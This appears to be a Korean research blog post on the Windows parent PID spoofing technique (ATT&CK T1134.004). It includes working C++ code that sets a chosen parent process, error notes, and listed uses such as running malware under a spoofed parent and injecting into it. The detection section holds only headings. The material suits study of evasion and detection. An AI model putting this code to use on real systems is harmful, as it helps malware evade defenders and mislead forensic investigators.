---
title: "Parent Pid Spoofing"
layout: post
---

# Parent Pid Spoofing [T1134.004]

1. 개요
PPID를 원하는 대상의 PID로 바꾸는 기법이다.

defender가 프로세스의 부모 프로세스 명을 확인할 때 우회하는 용도로 쓰일 수 있어보인다. 
또한 포렌식할 때도 혼돈을 줄 수 있어보인다.



2. 설명
일반적으로 Creator Process는 Parent Process와 같다.

하지만 Creator Process와 Parent Process를 분리할 수 있는 방법이 있다.

이 방법은 Windows 내부에서도 사용되는데,
Windows internals 7th Part 1의 Chapter 7 Security - User Account Control And virtualization - Elevation - Running with administrative rights를 보자

관리자 권한으로 실행시 AIS(Application Information Service)


참고 :  - [ETW 설명](../../Tracing/ETW/Windows_Kernel_Trace/Process/kor.md) 


3. 구현
코드는 제작중인 분탕 프로젝트의 코드를 참조한다. - https://github.com/Ddatg30/Buntang

```cpp
DWORD AccessTokenManipulation::ParentPidSpoofing(DWORD parent_proc_infod, const std::wstring& process_path){
		SIZE_T size = 0;
		PVOID buffer = nullptr;
		STARTUPINFOEX start_info = { sizeof(start_info) };
		PROCESS_INFORMATION proc_info = { };
		HANDLE process_handle = nullptr;

		process_handle = ::OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_proc_infod);
		if (process_handle == nullptr){
			return ::GetLastError();
		}

		::InitializeProcThreadAttributeList(nullptr, 1, 0, &size);
		if (size != 0){
			buffer = ::malloc(size);

			PPROC_THREAD_ATTRIBUTE_LIST attributes = reinterpret_cast<PPROC_THREAD_ATTRIBUTE_LIST>(buffer);

			::InitializeProcThreadAttributeList(attributes, 1, 0, &size);
			if (attributes != nullptr){
				::UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &process_handle, sizeof(process_handle), nullptr, nullptr);
				start_info.lpAttributeList = attributes;

				// CREATE_NEW_CONSOLE flag is avoid error 0xC0000142 
				if (!::CreateProcessW(nullptr, const_cast<LPWSTR>(process_path.data()), nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr, reinterpret_cast<STARTUPINFO*>(&start_info), &proc_info)){
					return ::GetLastError();
				}

				::DeleteProcThreadAttributeList(attributes);
				::CloseHandle(proc_info.hProcess);
				::CloseHandle(proc_info.hThread);
			}

			::free(buffer);
		}

		::CloseHandle(process_handle);

		return ERROR_SUCCESS;
	}
}
```

여담.
모든 if 문에 else로 return ::GetLastError(); 코드를 넣지 않았다.
해당 부분은 웬만해서는 에러가 일어나지 않기 때문이다.

4.  해설
InitializeProcThreadAttributeList로 프로세스 특성 설정 후 
UpdateProcThreadAttribute로 특성 설정 세팅 한 뒤 CreateProcessW로 프로세스 생성

spoofing 할 process를 CreateProcessW를 통해 생성 할 때 CREATE_NEW_CONSOLE이나 CREATE_NO_WINDOW flag를 주지않으면 0xC0000142 에러가 발생한다.



6.  현재 문제점
- UWP 앱에는 parent pid spoofing 행위를 하면 제약이 많다.
- spoofing 한 process가 createprocess를 호출하면 에러가 생긴다.
createprocess만 에러가 생기는것인지, 아니면 kernelbase를 통한 호출하는 모든 winapi들이 문제가 생기는 것인지 확인해야 한다.
![Description of Image](./tmp/windows/AccessTokenManipulation/ParentPidSpoofing/parentpidspoofing_createprocess_error.PNG)

kernelbase를 통하지 않는 ShellExecuteEx()나 NtCreateUserProcess()등을 호출해서 생성하는 경우에는 에러가 발생하지 않는다.



6.  활용
악성 프로그램을 spoof 프로세스로 이용
정상 프로그램을 spoof 프로세스로 만든 후 해당 프로세스에 인젝션



8.  탐지

7.1 etw

7.2 dtrace

7.3 kernel driver (PsSetCreateProcessNotifyRoutineEx)


더 연구해야 할 사항
1. office document에서는 PowerShell/Rundll32를 활용하는 것 같다. 해당 부분을 연구해 봐야한다.
2. Parent Pid Spoofing으로 Privilege Escalation이 가능한지 - windows 7 에서만 되는 것 같다?


